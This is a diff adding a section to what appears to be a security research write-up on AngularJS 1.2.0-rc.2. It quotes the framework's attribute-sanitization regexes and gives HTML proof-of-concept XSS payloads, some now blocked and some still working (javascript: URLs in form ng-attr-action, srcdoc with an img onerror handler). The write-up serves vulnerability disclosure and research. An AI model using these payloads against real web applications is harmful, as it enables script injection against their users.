@@ -348,3 +348,51 @@ function cspSafeGetterFn(key0, key1, key2, key3, key4) {
   };
 }
 }}}
+
+== AngularJS 1.2.0-rc.2 ==
+
+This currently most recent version of AngularJS has received an internal security audit and several of the aforementioned issues were fixed or mitigated. Well, several but not all of them. We cannot get a reference to a potentially dangerous object anymore - Function, window and others were black-listed. The CSP bypasses still work though.
+
+Interestingly, even the attribute-wrappers receive sanitization. Like it's the late nineties all over again:
+
+{{{
+  var hasDirectives = {},
+      Suffix = 'Directive',
+      COMMENT_DIRECTIVE_REGEXP = /^\s*directive\:\s*([\d\w\-_]+)\s+(.*)$/,
+      CLASS_DIRECTIVE_REGEXP = /(([\d\w\-_]+)(?:\:([^;]+))?;?)/,
+      aHrefSanitizationWhitelist = /^\s*(https?|ftp|mailto|file):/,
+      imgSrcSanitizationWhitelist = /^\s*(https?|ftp|file):|data:image\//;
+
+  // Ref: http://developers.whatwg.org/webappapis.html#event-handler-idl-attributes
+  // The assumption is that future DOM event attribute names will begin with
+  // 'on' and be composed of only English letters.
+  var EVENT_HANDLER_ATTR_REGEXP = /^(on[a-z]*|formaction)$/;
+}}}
+
+This prohibits an attacker from using JavaScript and other critical URL schemes for certain attributes - yet leaves a bunch of important attributes complete out of consideration.
+
+Here's what we *cannot* do anymore (DOM errors will be thrown, URLs will be prefixed with the string `unsafe:`):
+
+{{{
+<html ng-app>
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0-rc.2/angular.min.js"></script>
+</head>
+<body>
+	<a ng-attr-href="{{'javascript:'}}alert(1)">CLICK</a>
+	<iframe ng-attr-src="{{'javascript:alert(1)'}}"></a>
+</body>
+}}}
+
+And here's what we can still do:
+
+{{{
+<html ng-app>
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0-rc.2/angular.min.js"></script>
+</head>
+<body>
+	<form ng-attr-action="{{'javascript:'}}alert(1)"><button>CLICK</button></form>
+	<iframe ng-attr-srcdoc="{{'<img src=x onerror=alert(1)>'}}"></a>
+</body>
+}}}
